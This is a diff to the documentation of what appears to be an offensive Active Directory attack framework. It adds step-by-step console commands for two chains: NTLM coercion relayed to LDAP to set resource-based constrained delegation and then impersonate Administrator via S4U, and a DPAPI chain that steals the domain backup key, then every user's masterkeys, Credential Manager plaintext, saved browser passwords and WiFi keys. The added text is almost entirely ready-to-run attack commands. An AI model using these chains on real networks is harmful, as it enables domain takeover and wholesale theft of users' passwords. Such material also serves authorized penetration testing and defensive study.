@@ -131,6 +131,97 @@ run
 ```
 
 The coerced machine account's NetNTLMv2 lands in loot (type 'hash',
-hashcat mode 5600, challenge pinned to 1122334455667788). Forwarding
-the auth to a second target (real relay) is ntlmrelayx's job — point
-its listener at the same coerce result.
+hashcat mode 5600, challenge pinned to 1122334455667788).
+
+## The coerce -> relay -> RBCD -> s4u chain
+
+relay_smb takes the same coerced auth and FORWARDS it to LDAP on the
+DC — the machine account writes its own RBCD there, and s4u turns the
+delegation into a ticket:
+
+```
+# console 1 — relay (445 needs root; the callback is a UNC path, no port)
+use auxiliary/attack/relay_smb
+set RHOSTS dc.corp.local
+set SOURCE FZRELAY$          # an account you control (add_computer)
+run
+
+# console 2 — create the source, then coerce
+use auxiliary/attack/add_computer
+set RHOSTS dc.corp.local
+set DOMAIN corp.local
+set USERNAME Administrator
+set PASSWORD ...
+set COMPUTER_NAME FZRELAY$
+set COMPUTER_PASSWORD Passw0rd123!
+run
+
+use auxiliary/attack/coerce
+set RHOSTS target.corp.local
+set LISTENER <your forge box>
+set DOMAIN corp.local
+set USERNAME anyuser
+set PASSWORD ...
+run
+
+# console 1 again — after "RBCD set via relay"
+use auxiliary/attack/s4u
+set RHOSTS dc.corp.local
+set DOMAIN corp.local
+set USERNAME FZRELAY$
+set PASSWORD Passw0rd123!
+set SPN cifs/target.corp.local
+set IMPERSONATE Administrator
+run
+```
+
+Lab caveat: Samba DCs deny the RBCD self-write (the relay e2e proves
+the chain up to that denial) — Windows DCs accept it. That's the field
+behavior the module is built for.
+
+## The DPAPI chain
+
+One domain backup key opens everything every domain user ever
+protected. In order, each stage feeding the next:
+
+```
+use auxiliary/attack/dpapi_backupkey     # 1: the domain's backup key pair (DC admin)
+set RHOSTS dc.corp.local
+set DOMAIN corp.local
+set USERNAME Administrator
+set PASSWORD ...
+run
+
+use auxiliary/attack/dpapi_masterkeys    # 2: every domain user's masterkeys on a box
+set RHOSTS workstation.corp.local
+set DOMAIN corp.local
+set USERNAME Administrator
+set PASSWORD ...
+run
+
+use auxiliary/attack/dpapi_credentials   # 3: Credential Manager plaintext (cmdkey/RDP/drive logons)
+set RHOSTS workstation.corp.local
+set DOMAIN corp.local
+set USERNAME Administrator
+set PASSWORD ...
+run
+
+use auxiliary/attack/dpapi_chrome        # 4: saved Chrome/Edge passwords
+set RHOSTS workstation.corp.local
+set DOMAIN corp.local
+set USERNAME Administrator
+set PASSWORD ...
+run
+
+use auxiliary/attack/dpapi_system        # 5: machine side — DPAPI_SYSTEM keys, WiFi passwords
+set RHOSTS workstation.corp.local
+set DOMAIN corp.local
+set USERNAME Administrator
+set PASSWORD ...
+run
+```
+
+Stages 2-4 read the dpapi-backupkey loot from stage 1 automatically
+(KEY_LOOT picks a specific one); stage 5 is independent (it pulls its
+own keys from the target's hives). Everything lands in creds + loot —
+recovered passwords feed multi_spray like any other cred.
